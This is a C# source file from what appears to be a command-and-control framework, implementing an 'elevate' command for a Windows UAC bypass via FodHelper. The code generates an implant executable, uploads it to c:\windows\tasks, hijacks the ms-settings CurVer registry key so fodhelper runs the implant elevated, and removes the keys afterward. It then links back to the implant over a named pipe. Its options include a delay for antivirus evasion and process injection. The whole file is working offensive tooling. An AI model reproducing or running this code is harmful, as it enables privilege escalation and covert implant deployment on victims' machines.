using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.Payload;
using Shared;

namespace Common.Command.Custom
{
    public class ElevateCommandOptions
    {
        [CommandOption("-k", "--key", "Name of the key to use", "c2s")]
        public string key { get; set; }

        [CommandOption("-v", "--verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [CommandOption("-n", "--pipe", "Name of the pipe used to pivot.", "elev8")]
        public string pipe { get; set; }

        [CommandOption("-f", "--file", "FileName of payload.", null)]
        public string file { get; set; }

        [CommandOption("-p", "--path", "Name of the folder to upload the payload.", "c:\\windows\\tasks")]
        public string path { get; set; }

        [CommandOption("-i", "--inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
        public int injectDelay { get; set; }

        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
        public string injectProcess { get; set; }

        [CommandOption("-x86", "--x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }
    }

    public class ElevateCommand : CustomCommand<ElevateCommandOptions>
    {
        public override string Name => "elevate";

        public override string Description => "UAC Bypass using FodHelper";

        public override OsType[] SupportedOs => new OsType[] { OsType.Windows };


        protected override async Task<bool> Run(CommandExecutionContext<ElevateCommandOptions> context)
        {
            var options = context.Options;
            var commander = context.Commander;
            var agent = context.Agent;

            var endpoint = ConnexionUrl.FromString($"pipe://*:{options.pipe}");
            var payloadOptions = new ImplantConfig()
            {
                //StoreImplant = false,
                Architecture =  options.x86 ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                Type = ImplantType.Executable,
                //InjectionDelay =  options.injectDelay,
                //IsInjected = options.inject,
                //InjectionProcess = options.injectProcess
            };

            //if (!string.IsNullOrEmpty(options.injectProcess))
            //    payloadOptions.InjectionProcess = options.injectProcess;

            commander.WriteInfo($"[>] Generating Payload!");
            var implant = commander.GeneratePayload(payloadOptions);
            if (implant == null)
            {
                commander.WriteError($"[X] Generation Failed!");
                return false;
            }
            else
                commander.WriteSuccess($"[+] Generation succeed!");


            commander.WriteInfo($"[>] Preparing File Upload...");
            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

            
            agent.Echo($"Uploading file {fileName} to {path}");
            agent.Upload(Convert.FromBase64String(implant.Data), path);
            agent.Delay(1);

            commander.WriteInfo($"[>] Preparing Editing RegistryKey...");
            agent.Echo($"Altering registry Keys");
            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\.{options.key}\\Shell\\Open\\command\" /d \"{path}\" /f");
            agent.RegistryAdd(@$"HKCU\Software\Classes\.{options.key}\Shell\Open\command", string.Empty, path);
            //agent.Shell($"reg add \"HKCU\\Software\\Classes\\ms-settings\\CurVer\" /d \".{options.key}\" /f");
            agent.RegistryAdd(@$"HKCU\Software\Classes\ms-settings\CurVer", string.Empty, $".{options.key}");
            agent.Delay(10);
            commander.WriteInfo($"[>] Preparing FodHelper start...");
            agent.Echo($"Starting fodhelper");
            agent.Shell("fodhelper");
            agent.Delay(10);

            commander.WriteInfo($"[>] Preparing Cleaning...");
            agent.Echo($"Cleaning");
            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\.{options.key} -Recurse  -Force -Verbose");
            //agent.Powershell($"Remove-Item Registry::HKCU\\Software\\Classes\\ms-settings\\CurVer -Recurse -Force -Verbose");
            agent.RegistryRemove(@"HKCU\Software\Classes\", $".{options.key}");
            agent.RegistryRemove(@"HKCU\Software\Classes\ms-settings", $"CurVer");
            if (!options.inject)
            {
                agent.Echo($"[!] Don't forget to remove executable after use! : del {path}");
            }
            else
            {
                agent.Echo($"Waiting {options.injectDelay}s to evade antivirus");
                agent.Delay(options.injectDelay + 10);
                agent.Echo($"Removing injector {path}");
                agent.DeleteFile(path);
            }
            agent.Echo($"Linking to {endpoint}");
            var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
            agent.Link(targetEndPoint);
            agent.Delay(2);
            agent.Echo($"[*] Execution done!");
            agent.Echo(Environment.NewLine);

            return true;
        }
    }
}
